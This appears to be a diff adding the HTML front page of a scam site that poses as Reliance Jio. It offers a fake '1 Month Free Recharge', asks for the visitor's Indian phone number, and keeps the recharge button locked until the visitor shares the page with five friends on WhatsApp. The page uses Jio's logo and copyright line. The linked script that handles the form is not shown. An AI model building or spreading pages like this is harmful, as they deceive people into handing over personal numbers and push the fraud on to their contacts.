@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://kit.fontawesome.com/d1efa86846.js" crossorigin="anonymous"></script>
+    <title>JIO FREE RECHARGE</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <header class="header">
+        <img src="jio.png" alt="Jio Logo" class="logo">
+        <h2>1 Month Free Recharge Offer</h2>
+    </header>
+    
+    <main class="container">
+        <form id="userForm">
+            <div class="form-group">
+                <label for="phoneNumber">Phone Number:</label>
+                <div class="phone-input">
+                    <span class="country-code">+91</span>
+                    <input type="text" id="phoneNumber" name="phoneNumber" maxlength="10" required>
+                </div>
+            </div>
+            <div class="form-group">
+                <label for="network">Select Network:</label>
+                <select id="network" name="network">
+                    <option value="4g">4G</option>
+                    <option value="5g">5G</option>
+                </select>
+            </div>
+            <div class="form-group buttons">
+                <button type="button" id="firstButton" class="btn"><i class="fa-brands fa-whatsapp"></i>&nbsp;&nbsp;अपने 5 दोस्तो को शेयर करे </button>
+                <button type="button" id="secondButton" class="btn" disabled onclick="openRedirect()">RECHARGE</button>
+            </div>
+        </form>
+    </main>
+    
+    <footer class="footer">
+        <p>Copyright © 2024 Reliance Jio Infocomm Ltd. All rights reserved.</p>
+    </footer>
+
+    <script src="script.js"></script>
+</body>
+</html>
